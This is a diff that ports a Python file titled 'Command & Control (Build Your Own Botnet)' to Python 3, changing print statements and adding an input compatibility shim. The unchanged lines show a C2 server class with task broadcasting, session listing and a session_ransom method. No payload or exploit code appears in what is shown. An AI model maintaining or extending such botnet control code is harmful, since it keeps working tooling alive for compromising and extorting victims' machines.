@@ -1,6 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Command & Control (Build Your Own Botnet)'
+from __future__ import print_function
 
 # standard library
 import os
@@ -37,6 +38,11 @@ try:
     import colorama
 except ImportError:
     sys.exit("Error: missing package 'colorama' is required")
+
+try:
+    raw_input          # Python 2
+except NameError:
+    raw_input = input  # Python 3
 
 # globals
 __threads = {}
@@ -334,7 +340,7 @@ class C2():
         """
         if globals()['debug']:
             try:
-                print eval(code)
+                print(eval(code))
             except Exception as e:
                 util.log("Error: %s" % str(e))
         else:
@@ -389,7 +395,7 @@ class C2():
 
         """
         with self._lock:
-            print
+            print()
             if isinstance(info, dict):
                 if len(info):
                     self._print(info)
@@ -405,7 +411,7 @@ class C2():
                     util.display(str(info), color=self._text_color, style=self._text_style)
             else:
                 util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
-            print
+            print()
 
     def query(self, statement):
         """ 
@@ -506,11 +512,11 @@ class C2():
         lock = self.current_session._lock if self.current_session else self._lock
         tasks = self.database.get_tasks()
         with lock:
-            print
+            print()
             for task in tasks:
                 util.display(tasks.index(task) + 1)
                 self.database._display(task)        
-            print
+            print()
 
     def task_broadcast(self, command):
         """ 
@@ -654,10 +660,10 @@ class C2():
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         lock = self.current_session._lock if self.current_session else self._lock
         with lock:
-            print
+            print()
             sessions = self.database.get_sessions(verbose=verbose)
             self.database._display(sessions)
-            print
+            print()
 
     def session_ransom(self, args=None):
         """ 
